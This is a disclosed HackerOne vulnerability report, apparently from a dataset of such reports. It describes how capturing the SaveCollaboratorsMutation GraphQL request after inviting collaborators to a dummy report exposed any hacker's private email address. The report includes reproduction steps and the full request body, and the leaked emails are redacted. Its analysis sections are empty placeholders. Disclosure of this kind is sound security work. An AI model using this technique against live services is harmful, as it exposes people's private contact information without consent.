---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2032716'
original_report_id: '2032716'
title: An attacker can can view any hacker email via  /SaveCollaboratorsMutation operation
  name
weakness: Information Disclosure
team_handle: security
created_at: '2023-06-20T20:03:45.880Z'
disclosed_at: '2023-07-04T11:45:06.634Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 379
asset_identifier: hackerone.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- information-disclosure
---

# An attacker can can view any hacker email via  /SaveCollaboratorsMutation operation name

## Metadata

- HackerOne Report ID: 2032716
- Weakness: Information Disclosure
- Program: security
- Disclosed At: 2023-07-04T11:45:06.634Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**

An attacker can view any attacker or normal user email after send invitation via dummy report , disclose their private email.
 
**Description:**

### Steps To Reproduce

1 - Create a dummy report and send it
2 - Add a hacker that you want to disclose his email  , Max is only 2 invites per report
3 - send the invite after sending the invite the hacker will be pending status until accept the report .
4- Go the pen on the right for adding more collaborator and click on the pen and capture traffic , you will see the user email in first request,
even that the user not accept the invitation yet  

HTTP Request : 
```
POST /graphql HTTP/2
Host: hackerone.com

[sinp]

{"operationName":"SaveCollaboratorsMutation","variables":{"input":{"report_id":2032701,"collaborators":[{"username_or_email":"testmealways","bounty_weight":0.9989999999999999},{"username_or_email":"███████","bounty_weight":0.9989999999999999},{"username_or_email":"███████","bounty_weight":0.9989999999999999}]},"product_area":"collaboration","product_feature":"save_collaborators"},"query":"mutation SaveCollaboratorsMutation($input: SaveCollaboratorsMutationInput!) {\n  saveCollaborators(input: $input) {\n    was_successful\n    errors {\n      edges {\n        node {\n          message\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}

````

Example :

Here is email for todayisnew , Hacker 1 rank in H1 :

```
████████

```


Video PoC :

████████

## Impact

An attacker can view any user's email registered with Hackerone as hacker .

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
